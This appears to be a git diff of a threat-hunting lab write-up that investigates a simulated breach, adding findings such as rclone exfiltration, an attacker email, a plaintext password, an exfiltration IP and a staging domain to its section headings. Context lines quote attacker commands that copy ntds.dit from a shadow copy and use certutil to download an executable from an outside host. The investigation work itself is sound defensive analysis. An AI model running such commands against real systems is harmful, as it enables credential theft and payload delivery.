@@ -26,7 +26,7 @@ The investigation confirmed:
 
 ---
 
-# 1. Data Collection & Archive Creation
+# 1. Stolen Data Source Directory → C:\GameDev
 
 ## Investigation Task
 
@@ -45,7 +45,6 @@ The investigation focused on identifying archive creation activity and Living Of
 * Compression-related command lines
 * Staging directories
 * Built-in Windows compression utilities
-*
 
 ## Query Used
 
@@ -59,12 +58,12 @@ EmberForgeX_CL
 
 ### Screenshot
 
-<img width="908" height="304" alt="image" src="https://github.com/user-attachments/assets/b06ef146-9644-4c2b-9db0-c323ec49fc93" />
+<img width="1013" height="318" alt="Screenshot 2026-05-30 194924" src="https://github.com/user-attachments/assets/f8377173-20c2-4375-a9d8-22d12b529d66" />
 
 
 ---
 
-# 2. Exfiltration Tool Discovery
+# 2. Exfiltration Tool Discovery - rclone.exe
 
 ## Investigation Task
 
@@ -96,13 +95,12 @@ EmberForgeX_CL
 
 ### Screenshot
 
-<img width="1013" height="318" alt="image" src="https://github.com/user-attachments/assets/4d1983e4-cbc7-4d90-be70-a5cddeef87ed" />
-
+<img width="1021" height="321" alt="image" src="https://github.com/user-attachments/assets/beb5f25e-259b-4988-a9f5-179427c83c85" />
 
 
 ---
 
-# 3. Attacker Email Attribution
+# 3. Attacker Email Attribution - jwilson.vhr@proton.me
 
 
 ## Investigation Task
@@ -138,7 +136,7 @@ EmberForgeX_CL
 
 ---
 
-# 4. Plaintext Credential Exposure
+# 4. Plaintext Credential Exposure - Summer2024!
 
 
 ## Investigation Task
@@ -173,7 +171,7 @@ EmberForgeX_CL
 
 ---
 
-# 5. Exfiltration Destination IP
+# 5. Exfiltration Destination IP - 66.203.125.15
 
 ## Investigation Task
 
@@ -212,7 +210,7 @@ EmberForgeX_CL
 
 ---
 
-# 6. Active Directory Credential Database Theft
+# 6. Active Directory Credential Database Theft - ntds.dit
 
 ## Investigation Task
 
@@ -256,7 +254,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Wi
 
 ---
 
-# 7. Staging Infrastructure Discovery
+# 7. Staging Infrastructure Discovery - sync.cloud-endpoint.net
 
 ## Investigation Task
 
@@ -307,11 +305,13 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 ### Screenshot
 
-(Add screenshot here)
+<img width="1031" height="333" alt="image" src="https://github.com/user-attachments/assets/9565d1c2-651c-4356-94c1-ee8f2135c83c" />
+
+
 
 ---
 
-# 8. DNS Infrastructure Correlation
+# 8. DNS Infrastructure Correlation - sync.cloud-endpoint.net
 
 ## Investigation Task
 
